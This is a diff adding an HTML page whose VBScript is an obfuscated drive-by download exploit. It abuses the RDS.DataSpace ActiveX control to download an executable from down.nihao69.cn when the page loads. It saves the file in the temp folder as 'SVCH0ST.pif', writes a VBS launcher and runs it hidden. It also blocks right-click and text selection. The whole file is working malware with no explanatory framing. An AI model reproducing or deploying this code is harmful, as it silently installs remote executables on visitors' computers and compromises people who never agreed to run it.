@@ -1,0 +1,78 @@
+/*
+*/
+<html>
+<body>
+</body>
+<script language=VBScript>
+On Error Resume Next
+Cuteqqaddressssssssss = "http://down.nihao69.cn/down/ko.exe"
+cuteqqobj="o"
+cuteqqobjs="b"
+cuteqqobjss="j"
+cuteqqobjsss="e"
+cuteqqobjssss="c"
+cuteqqobjsssSs="t"
+Set cuteqq_2_cn = document.createElement(cuteqqobj&cuteqqobjs&cuteqqobjss&cuteqqobjsss&cuteqqobjssss&cuteqqobjsssSs)
+cuteqqid="clsid:"
+cuteqqidx="BD"
+cuteqqid2="96"
+cuteqqid3="C5"
+cuteqqid4="56-6"
+cuteqqid5="5A"
+cuteqqid6="3-1"
+cuteqqid7="1D"
+cuteqqid8="0-98"
+cuteqqid9="3A-0"
+cuteqqid10="0C0"
+cuteqqid11="4FC"
+cuteqqid12="29E"
+cuteqqid13="36"
+cuteqq3="Microsoft.X"
+cuteqq4="MLHTTp"
+cuteqq5="G"
+cuteqq6="E"
+cuteqq7="T"
+cuteqqxml="M"&"i"&"c"&"r"&"osof"&"t.XM"&"LHTTp"
+cuteqq_2_cn.SetAttribute "classid", cuteqqid&cuteqqidx&cuteqqid2&cuteqqid3&cuteqqid4&cuteqqid5&cuteqqid6&cuteqqid7&cuteqqid8&cuteqqid9&cuteqqid10&cuteqqid11&cuteqqid12&cuteqqid13
+Set Cuteqq_love=cuteqq_2_cn.CreateObject(cuteqqxml,"")
+Cuteqq_love.Open cuteqq5&cuteqq6&cuteqq7, Cuteqqaddressssssssss, False
+Cuteqq_love.Send
+Cuteqqbuffe="SVCH0ST.pif"
+Cuteqq_kfqq_sssssssss="SVCH0ST.vbs"
+Q784378237="Scripting."
+Q784378237s="FileSyst"
+Q784378237ss="emObject"
+Q784378237sss="Adod"
+Q784378237ssss="b.stream"
+Q784378237sssss=Q784378237sss&Q784378237ssss
+Set chilam = cuteqq_2_cn.createobject(Q784378237&Q784378237s&Q784378237ss,"")
+Set yingying = chilam.GetSpecialFolder(2)
+Cuteqquser="chilam"
+Cuteqqbuffe=chilam.BuildPath(yingying,Cuteqqbuffe)
+Cuteqq_kfqq_sssssssss=chilam.BuildPath(yingying,Cuteqq_kfqq_sssssssss)
+Set chilams = cuteqq_2_cn.createobject(Q784378237sssss,"")
+chilams.type=1
+chilams.Open
+chilams.Write Cuteqq_love.Responsebody
+chilams.Savetofile Cuteqqbuffe,2
+chilams.Close
+chilams.Type=2
+chilams.Open
+chilams.WriteText  "'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"Set i_love_cuteqq = CreateObject(""Wscript"&".Shell"")"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"i_love_cuteqq.run ("""&Cuteqqbuffe&""")"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"
+chilams.Savetofile Cuteqq_kfqq_sssssssss,2
+chilams.Close
+www="She"
+cute="ll.A"
+qq="ppl"
+cn="ica"
+kfqq="tion"
+Set Cuteqqsened = cuteqq_2_cn.createobject(www&cute&qq&cn&kfqq, "")
+cuteqqdk="O"
+cuteqqdks="p"
+cuteqqdkss="e"
+cuteqqdksss="n"
+Cuteqqsened.ShellExeCute Cuteqq_kfqq_sssssssss, "", "", cuteqqdk&cuteqqdks&cuteqqdkss&cuteqqdksss, 0
+</script>
+</html>
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
